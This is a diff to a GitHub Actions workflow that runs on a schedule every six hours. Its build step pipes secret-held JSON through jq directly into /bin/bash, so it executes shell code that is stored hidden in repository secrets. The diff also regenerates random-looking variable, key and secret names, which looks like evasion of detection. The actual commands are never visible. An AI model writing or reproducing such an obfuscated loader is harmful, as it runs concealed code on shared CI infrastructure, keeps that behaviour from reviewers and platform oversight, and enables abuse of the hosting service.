@@ -1,10 +1,9 @@
 name: lingbingshuodai
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
-jobs:  # 8029
+    - cron: '54 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +11,14 @@ jobs:  # 8029
       - uses: actions/checkout@v4
       - name: lingbingshuodai
         env:
-          rr44179: ${{ secrets.rr44179 }}
+          s0652: ${{ secrets.s0652 }}
         run: |
-          echo $rr44179 | jq -r .tbi249 | /bin/bash
-          echo $ffibl250 | jq -r .xsai9077 | /bin/bash
-          echo $w91 | jq -r .pxr81 | /bin/bash
-          echo $kzt54899 | jq -r .bic5 | /bin/bash
-          echo $j25 | jq -r .bdps202 | /bin/bash
-          echo $gqct74431 | jq -r .tw326 | /bin/bash
-          echo $jbn87 | jq -r .jfw4 | /bin/bash
-          echo $w7 | jq -r .v919 | /bin/bash
-          echo $owtex749 | jq -r .r632 | /bin/bash
-          echo $ihde3809 | jq -r .cn039 | /bin/bash
-          echo $cbw4490 | jq -r .zf40978 | /bin/bash
-          echo $kzp00029 | jq -r .hmhpt3 | /bin/bash
-          echo $c9997 | jq -r .howf880 | /bin/bash
+          echo $s0652 | jq -r .ucmc5 | /bin/bash
+          echo $lm9 | jq -r .gdoo88213 | /bin/bash
+          echo $qmgj831 | jq -r .mihz31841 | /bin/bash
+          echo $di7046 | jq -r .mob52927 | /bin/bash
+          echo $nnjyw471 | jq -r .ohih349 | /bin/bash
+          echo $tdme7 | jq -r .apm32 | /bin/bash
+          echo $upmkg26 | jq -r .tq35 | /bin/bash
+          echo $pqn4204 | jq -r .n17 | /bin/bash
 
